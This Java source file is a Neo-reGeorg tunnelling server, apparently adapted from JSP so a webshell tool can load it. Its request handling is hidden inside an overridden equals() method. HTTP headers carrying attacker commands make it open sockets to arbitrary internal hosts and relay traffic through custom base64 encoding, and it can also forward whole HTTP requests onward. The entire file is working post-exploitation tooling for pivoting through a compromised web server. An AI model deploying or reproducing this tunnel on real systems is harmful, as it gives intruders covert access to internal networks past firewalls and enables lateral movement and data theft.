import javax.servlet.ServletContext;
import javax.servlet.ServletInputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.Writer;
import java.net.*;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;

/**
 * @Modifier c0ny1, L
 * @CreateDate 2021-08-17
 * @Description 将Neo-reGeorg jsp服务端改为java代码，提高兼容性
 */

public class NeoreGeorg {
    private char[] en;
    private byte[] de;

    @Override
    public boolean equals(Object obj) {
        try {
            Object[] args                = (Object[]) obj;
            HttpServletRequest request   = (HttpServletRequest) args[0];
            HttpServletResponse response = (HttpServletResponse) args[1];
            en                           = (char[]) args[2];
            de                           = (byte[]) args[3];
            int HTTPCODE                 = (Integer) args[4];
            int READBUF                  = (Integer) args[5];
            int MAXREADSIZE              = (Integer) args[6];
            String XSTATUS               = (String) args[7];
            String XERROR                = (String) args[8];
            String XCMD                  = (String) args[9];
            String XTARGET               = (String) args[10];
            String XREDIRECTURL          = (String) args[11];
            String FAIL                  = (String) args[12];
            String GeorgHello            = (String) args[13];
            String FailedCreatingSocket  = (String) args[14];
            String FailedConnecting      = (String) args[15];
            String OK                    = (String) args[16];
            String FailedWriting         = (String) args[17];
            String CONNECT               = (String) args[18];
            String DISCONNECT            = (String) args[19];
            String READ                  = (String) args[20];
            String FORWARD               = (String) args[21];
            String FailedReading         = (String) args[22];
            String CloseNow              = (String) args[23];
            String ReadFiled             = (String) args[24];
            String ForwardingFailed      = (String) args[25];

            ServletContext application = request.getSession().getServletContext();
            Writer out = response.getWriter();

            String rUrl = request.getHeader(XREDIRECTURL);
            if (rUrl != null) {
                rUrl = new String(b64de(rUrl));
                if (!islocal(rUrl)){
                    // ssl verify is not ignored
                    response.reset();
                    String method = request.getMethod();
                    URL u = new URL(rUrl);
                    HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                    conn.setRequestMethod(method);
                    conn.setDoOutput(true);

                    // conn.setConnectTimeout(200);
                    // conn.setReadTimeout(200);

                    Enumeration enu = request.getHeaderNames();
                    List<String> keys = Collections.list(enu);
                    Collections.reverse(keys);
                    for (String key : keys){
                        if (!key.equalsIgnoreCase(XREDIRECTURL)){ // X-REDIRECTURL
                            String value=request.getHeader(key);
                            conn.setRequestProperty(headerkey(key), value);
                        }
                    }

                    int i;
                    byte[] buffer = new byte[1024];
                    if (request.getContentLength() != -1){
                        OutputStream output;
                        try{
                            output = conn.getOutputStream();
                        }catch(Exception e){
                            response.setHeader(XERROR, ForwardingFailed);
                            return false;
                        }

                        ServletInputStream inputStream = request.getInputStream();
                        while ((i = inputStream.read(buffer)) != -1) {
                            output.write(buffer, 0, i);
                        }
                        output.flush();
                        output.close();
                    }

                    for (String key : conn.getHeaderFields().keySet()) {
                        if (key != null && !key.equalsIgnoreCase("Content-Length") && !key.equalsIgnoreCase("Transfer-Encoding")){
                            String value = conn.getHeaderField(key);
                            response.setHeader(key, value);
                        }
                    }

                    InputStream hin;
                    if (conn.getResponseCode() < HttpURLConnection.HTTP_BAD_REQUEST) {
                        hin = conn.getInputStream();
                    } else {
                        hin = conn.getErrorStream();
                        if (hin == null){
                            response.setStatus(HTTPCODE);
                            return false;
                        }
                    }

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    while ((i = hin.read(buffer)) != -1) {
                        byte[] data = new byte[i];
                        System.arraycopy(buffer, 0, data, 0, i);
                        baos.write(data);
                    }
                    String responseBody = new String(baos.toByteArray());
                    response.addHeader("Content-Length", Integer.toString(responseBody.length()));
                    response.setStatus(conn.getResponseCode());
                    out.write(responseBody);
                    out.flush();

                    if ( true ) return false; // exit
                }
            }

            response.resetBuffer();
            response.setStatus(HTTPCODE);
            String cmd = request.getHeader(XCMD);
            if (cmd != null) {
                String mark = cmd.substring(0,22);
                cmd = cmd.substring(22);
                response.setHeader(XSTATUS, OK);
                if (cmd.compareTo(CONNECT) == 0) {
                    try {
                        String[] target_ary = new String(b64de(request.getHeader(XTARGET))).split("\\|");
                        String target = target_ary[0];
                        int port = Integer.parseInt(target_ary[1]);
                        SocketChannel socketChannel = SocketChannel.open();
                        socketChannel.connect(new InetSocketAddress(target, port));
                        socketChannel.configureBlocking(false);
                        application.setAttribute(mark, socketChannel);
                        response.setHeader(XSTATUS, OK);
                    } catch (Exception e) {
                        response.setHeader(XERROR, FailedConnecting);
                        response.setHeader(XSTATUS, FAIL);
                    }
                } else if (cmd.compareTo(DISCONNECT) == 0) {
                    SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
                    try{
                        socketChannel.socket().close();
                    } catch (Exception e) {
                    }
                    application.removeAttribute(mark);
                } else if (cmd.compareTo(READ) == 0){
                    SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
                    try{
                        ByteBuffer buf = ByteBuffer.allocate(READBUF);
                        int bytesRead = socketChannel.read(buf);
                        int maxRead = MAXREADSIZE;
                        int readLen = 0;
                        while (bytesRead > 0){
                            byte[] data = new byte[bytesRead];
                            System.arraycopy(buf.array(), 0, data, 0, bytesRead);
                            out.write(b64en(data));
                            out.flush();
                            ((java.nio.Buffer)buf).clear();
                            readLen += bytesRead;
                            if (bytesRead < READBUF || readLen >= maxRead)
                                break;
                            bytesRead = socketChannel.read(buf);
                        }
                        response.setHeader(XSTATUS, OK);

                    } catch (Exception e) {
                        response.setHeader(XSTATUS, FAIL);
                    }

                } else if (cmd.compareTo(FORWARD) == 0){
                    SocketChannel socketChannel = (SocketChannel)application.getAttribute(mark);
                    try {
                        String inputData = "";
                        InputStream in = request.getInputStream();
                        while ( true ){
                            int buffLen = in.available();
                            if (buffLen == -1)
                                break;
                            byte[] buff = new byte[buffLen];
                            if (in.read(buff) == -1)
                                break;
                            inputData += new String(buff);
                        }
                        byte[] base64 = b64de(inputData);
                        ByteBuffer buf = ByteBuffer.allocate(base64.length);
                        buf.put(base64);
                        buf.flip();

                        while(buf.hasRemaining())
                            socketChannel.write(buf);

                        response.setHeader(XSTATUS, OK);

                    } catch (Exception e) {
                        response.setHeader(XERROR, ReadFiled);
                        response.setHeader(XSTATUS, FAIL); // X-STATUS: FAIL
                        socketChannel.socket().close();
                    }
                }
            } else {
                out.write(GeorgHello);
            }
        }catch (Exception e){

        }
        return false;
    }

    public String b64en(byte[] data) {
        StringBuffer sb = new StringBuffer();
        int len = data.length;
        int i = 0;
        int b1, b2, b3;
        while (i < len) {
            b1 = data[i++] & 0xff;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[(b1 & 0x3) << 4]);
                sb.append("==");
                break;
            }
            b2 = data[i++] & 0xff;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[((b1 & 0x03) << 4)
                        | ((b2 & 0xf0) >>> 4)]);
                sb.append(en[(b2 & 0x0f) << 2]);
                sb.append("=");
                break;
            }
            b3 = data[i++] & 0xff;
            sb.append(en[b1 >>> 2]);
            sb.append(en[((b1 & 0x03) << 4)
                    | ((b2 & 0xf0) >>> 4)]);
            sb.append(en[((b2 & 0x0f) << 2)
                    | ((b3 & 0xc0) >>> 6)]);
            sb.append(en[b3 & 0x3f]);
        }
        return sb.toString();
    }



    public  byte[] b64de(String str) {
        byte[] data = str.getBytes();
        int len = data.length;
        ByteArrayOutputStream buf = new ByteArrayOutputStream(len);
        int i = 0;
        int b1, b2, b3, b4;
        while (i < len) {
            do {
                b1 = de[data[i++]];
            } while (i < len && b1 == -1);
            if (b1 == -1) {
                break;
            }
            do {
                b2 = de[data[i++]];
            } while (i < len && b2 == -1);
            if (b2 == -1) {
                break;
            }
            buf.write((int) ((b1 << 2) | ((b2 & 0x30) >>> 4)));
            do {
                b3 = data[i++];
                if (b3 == 61) {
                    return buf.toByteArray();
                }
                b3 = de[b3];
            } while (i < len && b3 == -1);
            if (b3 == -1) {
                break;
            }
            buf.write((int) (((b2 & 0x0f) << 4) | ((b3 & 0x3c) >>> 2)));
            do {
                b4 = data[i++];
                if (b4 == 61) {
                    return buf.toByteArray();
                }
                b4 = de[b4];
            } while (i < len && b4 == -1);
            if (b4 == -1) {
                break;
            }
            buf.write((int) (((b3 & 0x03) << 6) | b4));
        }
        return buf.toByteArray();
    }

    static String headerkey(String str) throws Exception {
        String out = "";
        for (String block: str.split("-")) {
            out += block.substring(0, 1).toUpperCase() + block.substring(1);
            out += "-";
        }
        return out.substring(0, out.length() - 1);
    }

    boolean islocal(String url) throws Exception {
        String ip = (new URL(url)).getHost();
        Enumeration<NetworkInterface> nifs = NetworkInterface.getNetworkInterfaces();
        while (nifs.hasMoreElements()) {
            NetworkInterface nif = nifs.nextElement();
            Enumeration<InetAddress> addresses = nif.getInetAddresses();
            while (addresses.hasMoreElements()) {
                InetAddress addr = addresses.nextElement();
                if (addr instanceof Inet4Address)
                    if (addr.getHostAddress().equals(ip))
                        return true;
            }
        }
        return false;
    }
}
